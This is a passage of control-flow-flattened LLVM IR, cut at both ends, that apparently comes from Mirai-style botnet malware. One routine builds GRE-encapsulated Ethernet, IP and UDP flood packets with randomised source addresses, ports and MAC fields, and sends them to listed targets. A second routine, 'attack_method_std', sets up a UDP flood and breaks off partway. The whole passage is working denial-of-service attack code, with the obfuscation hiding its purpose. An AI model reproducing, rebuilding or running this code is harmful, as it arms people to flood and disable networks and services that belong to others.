  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 5
  store i8 %209, i8* %211, align 4
  %212 = load i8, i8* %15, align 1
  %213 = icmp ne i8 %212, 0
  %214 = select i1 %213, i32 -1153410918, i32 -1489426457
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 4
  store i16 %216, i16* %218, align 2
  store i32 -1489426457, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 17, i8* %221, align 1
  %222 = call i32 @rand_next()
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load i8, i8* %20, align 1
  %226 = icmp ne i8 %225, 0
  %227 = select i1 %226, i32 -218116863, i32 792002810
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 9
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  store i32 1200140703, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 8
  %237 = load i32, i32* %236, align 4
  %238 = sub i32 %237, 1024
  %239 = xor i32 %238, -1
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 1200140703, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i16, i16* %16, align 2
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i16 %244, i16* %246, align 2
  %247 = load i16, i16* %17, align 2
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 1
  store i16 %248, i16* %250, align 2
  %251 = load i32, i32* %18, align 4
  %252 = sext i32 %251 to i64
  %253 = add i64 8, %252
  %254 = trunc i64 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 2
  store i16 %255, i16* %257, align 2
  store i32 1828952948, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  store i32 -1875574251, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 -173956448, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 693126201, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %9, align 4
  %265 = load i8, i8* %5, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  %268 = select i1 %267, i32 491672385, i32 -23227160
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8**, i8*** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8*, i8** %270, i64 %272
  %274 = load i8*, i8** %273, align 8
  store i8* %274, i8** %30, align 8
  %275 = load i8*, i8** %30, align 8
  %276 = bitcast i8* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %31, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.grehdr*
  store %struct.grehdr* %279, %struct.grehdr** %32, align 8
  %280 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %281 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %280, i64 1
  %282 = bitcast %struct.grehdr* %281 to %struct.ethhdr*
  store %struct.ethhdr* %282, %struct.ethhdr** %33, align 8
  %283 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %284 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %283, i64 1
  %285 = bitcast %struct.ethhdr* %284 to %struct.iphdr*
  store %struct.iphdr* %285, %struct.iphdr** %34, align 8
  %286 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i64 1
  %288 = bitcast %struct.iphdr* %287 to %struct.udphdr*
  store %struct.udphdr* %288, %struct.udphdr** %35, align 8
  %289 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i64 1
  %291 = bitcast %struct.udphdr* %290 to i8*
  store i8* %291, i8** %36, align 8
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 2
  %297 = load i8, i8* %296, align 4
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %298, 32
  %300 = select i1 %299, i32 391319825, i32 848277881
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  store i32 848277881, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %21, align 4
  %324 = icmp eq i32 %323, -1
  %325 = select i1 %324, i32 -1110865577, i32 791349011
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 8
  store i32 %327, i32* %329, align 4
  store i32 791349011, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i16, i16* %13, align 2
  %332 = zext i16 %331 to i32
  %333 = icmp eq i32 %332, 65535
  %334 = select i1 %333, i32 297671768, i32 -39014875
  store i32 %334, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 3
  %343 = load i16, i16* %342, align 4
  %344 = zext i16 %343 to i32
  %345 = sub nsw i32 %344, 1000
  %346 = xor i32 %345, -1
  %347 = trunc i32 %346 to i16
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 3
  store i16 %347, i16* %349, align 4
  store i32 -39014875, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i16, i16* %16, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  %354 = select i1 %353, i32 -1944962621, i32 657719987
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call i32 @rand_next()
  %357 = and i32 %356, 65535
  %358 = trunc i32 %357 to i16
  %359 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 0
  store i16 %358, i16* %360, align 2
  store i32 657719987, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i16, i16* %17, align 2
  %363 = zext i16 %362 to i32
  %364 = icmp eq i32 %363, 65535
  %365 = select i1 %364, i32 -777822706, i32 -41283542
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  store i32 -41283542, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i8, i8* %20, align 1
  %374 = icmp ne i8 %373, 0
  %375 = select i1 %374, i32 231662717, i32 -672547286
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 9
  store i32 %377, i32* %379, align 4
  store i32 1153249698, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  %383 = load i32, i32* %382, align 4
  %384 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  store i32 1153249698, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  store i32 %387, i32* %37, align 4
  %388 = call i32 @rand_next()
  store i32 %388, i32* %38, align 4
  %389 = call i32 @rand_next()
  store i32 %389, i32* %39, align 4
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 0
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %392, i8* %393, i32 4)
  %394 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %395 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %394, i32 0, i32 1
  %396 = getelementptr inbounds [6 x i8], [6 x i8]* %395, i32 0, i32 0
  %397 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 4)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %401, i8* %402, i32 2)
  %403 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %404 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %403, i32 0, i32 1
  %405 = getelementptr inbounds [6 x i8], [6 x i8]* %404, i32 0, i32 0
  %406 = getelementptr inbounds i8, i8* %405, i64 4
  %407 = bitcast i32* %39 to i8*
  %408 = getelementptr inbounds i8, i8* %407, i64 2
  call void @util_memcpy(i8* %406, i8* %408, i32 2)
  %409 = load i8, i8* %19, align 1
  %410 = icmp ne i8 %409, 0
  %411 = select i1 %410, i32 -1909762955, i32 -1011647712
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %36, align 8
  %414 = load i32, i32* %18, align 4
  call void @rand_str(i8* %413, i32 %414)
  store i32 -1011647712, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = bitcast %struct.iphdr* %418 to i16*
  %420 = call zeroext i16 @checksum_generic(i16* %419, i32 20)
  %421 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 %420, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 0, i16* %424, align 2
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = bitcast %struct.iphdr* %425 to i16*
  %427 = call zeroext i16 @checksum_generic(i16* %426, i32 20)
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 %427, i16* %429, align 2
  %430 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 3
  store i16 0, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %433 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %434 = bitcast %struct.udphdr* %433 to i8*
  %435 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %436 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %435, i32 0, i32 2
  %437 = load i16, i16* %436, align 2
  %438 = load i32, i32* %18, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 8, %439
  %441 = trunc i64 %440 to i32
  %442 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %432, i8* %434, i16 zeroext %437, i32 %441)
  %443 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 3
  store i16 %442, i16* %444, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 0
  store i16 2, i16* %450, align 4
  %451 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %455 = load i32, i32* %9, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %454, i64 %456
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i32 0, i32 0
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %458, i32 0, i32 2
  %460 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %459, i32 0, i32 0
  store i32 %453, i32* %460, align 4
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 0
  %466 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %465, i32 0, i32 1
  store i16 0, i16* %466, align 2
  %467 = load i32, i32* %10, align 4
  %468 = load i8*, i8** %30, align 8
  %469 = load i32, i32* %18, align 4
  %470 = sext i32 %469 to i64
  %471 = add i64 66, %470
  %472 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = bitcast %struct.sockaddr_in* %477 to %struct.sockaddr*
  store %struct.sockaddr* %478, %struct.sockaddr** %472, align 8
  %479 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %480 = load %struct.sockaddr*, %struct.sockaddr** %479, align 8
  %481 = call i64 @sendto(i32 %467, i8* %468, i64 %471, i32 16384, %struct.sockaddr* %480, i32 16)
  store i32 -676720712, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %9, align 4
  %484 = add nsw i32 %483, 1
  store i32 %484, i32* %9, align 4
  store i32 693126201, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  store i32 -173956448, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %485, %482, %415, %412, %386, %380, %376, %372, %366, %361, %355, %350, %335, %330, %326, %322, %301, %269, %263, %262, %261, %258, %242, %234, %228, %219, %215, %162, %158, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1875699815, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1875699815, label %first
    i32 486170930, label %52
    i32 -914993737, label %55
    i32 -650975018, label %58
    i32 1779350989, label %59
    i32 -2030623156, label %65
    i32 -28694821, label %75
    i32 1015292506, label %84
    i32 1317882003, label %93
    i32 182520179, label %101
    i32 922155406, label %102
    i32 1908742366, label %120
    i32 -647869358, label %121
    i32 663699256, label %131
    i32 -1921938277, label %157
    i32 1538437044, label %175
    i32 1062571838, label %176
    i32 1256129365, label %177
    i32 532839543, label %180
    i32 -1587660928, label %181
    i32 -931660349, label %182
    i32 702912320, label %188
    i32 -1361565163, label %197
    i32 1846256871, label %201
    i32 1624243843, label %211
    i32 -1352276332, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 486170930, i32 -914993737
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 -650975018, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 -650975018, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1779350989, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 -2030623156, i32 532839543
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -28694821, i32 1015292506
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 1317882003, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 1317882003, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 182520179, i32 922155406
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 1908742366, i32 -647869358
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -647869358, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 663699256, i32 -1921938277
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
